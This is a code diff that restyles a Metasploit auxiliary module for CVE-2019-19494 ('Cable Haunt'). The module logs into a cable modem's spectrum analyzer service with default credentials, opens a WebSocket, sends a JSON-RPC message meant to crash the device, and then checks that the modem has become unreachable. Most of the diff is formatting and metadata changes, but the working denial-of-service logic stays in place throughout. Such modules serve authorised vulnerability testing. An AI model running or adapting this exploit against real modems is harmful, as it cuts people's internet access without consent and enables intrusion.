@@ -1,6 +1,12 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'eventmachine'
+require 'faye/websocket'
+
 class MetasploitModule < Msf::Auxiliary
-  require 'eventmachine'
-  require 'faye/websocket'
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -12,9 +18,8 @@ class MetasploitModule < Msf::Auxiliary
         is exploitable, but since an exploit would differ between
         every make, model, and firmware version (which also
         differs from ISP to ISP), this module simply causes a
-        Denial of Service to test if the vulnerability is present.'
+        Denial of Service to test if the vulnerability is present.
       },
-      'License' => MSF_LICENSE,
       'Author' => [
         'Alexander Dalsgaard Krog (Lyrebirds)', # Original research, discovery, and PoC
         'Jens Hegner Stærmose (Lyrebirds)', # Original research, discovery, and PoC
@@ -22,29 +27,23 @@ class MetasploitModule < Msf::Auxiliary
         'Simon Vandel Sillesen (Independent)', # Original research, discovery, and PoC
         'Nicholas Starke' # msf module
       ],
-      'Privileged' => false,
-      'Targets' => [
+      'References' => [
+        ['CVE', '2019-19494'],
+        ['EDB', '47936'],
+        ['URL', 'https://cablehaunt.com/'],
+        ['URL', 'https://github.com/Lyrebirds/sagemcom-fast-3890-exploit']
       ],
       'DisclosureDate' => 'Jan 07 2020',
-      'DefaultOptions' => {
-      },
-      'DefaultTarget' => 0,
-      'References'    =>
-        [
-          ['EDB', '47936'],
-          ['CVE', '2019-19494'],
-          ['URL', 'https://cablehaunt.com/'],
-          ['URL', 'https://github.com/Lyrebirds/sagemcom-fast-3890-exploit']
-        ]
+      'License' => MSF_LICENSE
     ))
 
     register_options(
       [
         Opt::RHOST('192.168.100.1'),
         Opt::RPORT(8080),
-        OptString.new('WS_USERNAME', [ true, 'WebSocket connection basic auth username', 'admin']),
-        OptString.new('WS_PASSWORD', [ true, 'WebSocket connection basic auth password', 'password']),
-        OptInt.new('TIMEOUT', [ true, 'Time to wait for response', 15])
+        OptString.new('WS_USERNAME', [true, 'WebSocket connection basic auth username', 'admin']),
+        OptString.new('WS_PASSWORD', [true, 'WebSocket connection basic auth password', 'password']),
+        OptInt.new('TIMEOUT', [true, 'Time to wait for response', 15])
       ]
     )
 
@@ -55,21 +54,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     res = send_request_cgi({
-      'authorization' => basic_auth(datastore['WS_USERNAME'], datastore['WS_PASSWORD']),
-      'uri' => '/',
       'method' => 'GET',
+      'uri' => '/',
+      'authorization' => basic_auth(datastore['WS_USERNAME'], datastore['WS_PASSWORD'])
     })
 
     fail_with(Failure::Unreachable, 'Cannot Connect to Cable Modem Spectrum Analyzer Web Service') if res.nil?
     fail_with(Failure::Unknown, 'Credentials were incorrect') if res.code != 200
 
     @succeeded = false
-    EM.run {
+    EM.run do
       print_status("Attempting Connection to #{datastore['RHOST']}")
 
       driver = Faye::WebSocket::Client.new("ws://#{datastore['RHOST']}:#{datastore['RPORT']}/Frontend", ['rpc-frontend'])
 
-      driver.on :open do |event|
+      driver.on :open do
         print_status('Opened connection')
 
         EM::Timer.new(1) do
@@ -88,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
               },
               'id': '0'
             }.to_json)
-          rescue
+          rescue StandardError
             fail_with(Failure::Unreachable, 'Could not establish websocket connection')
           end
         end
@@ -98,8 +97,8 @@ class MetasploitModule < Msf::Auxiliary
         print_status('Checking Modem Status')
         begin
           res = send_request_cgi({
-            'uri' => '/',
             'method' => 'GET',
+            'uri' => '/'
           })
 
           if res.nil?
@@ -108,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
           else
             fail_with(Failure::Unknown, 'Host still reachable')
           end
-        rescue
+        rescue StandardError
           @succeeded = true
           print_status('Cable Modem unreachable')
         end
@@ -122,6 +121,6 @@ class MetasploitModule < Msf::Auxiliary
           fail_with(Failure::Unknown, 'Unknown failure occurred')
         end
       end
-    }
+    end
   end
 end
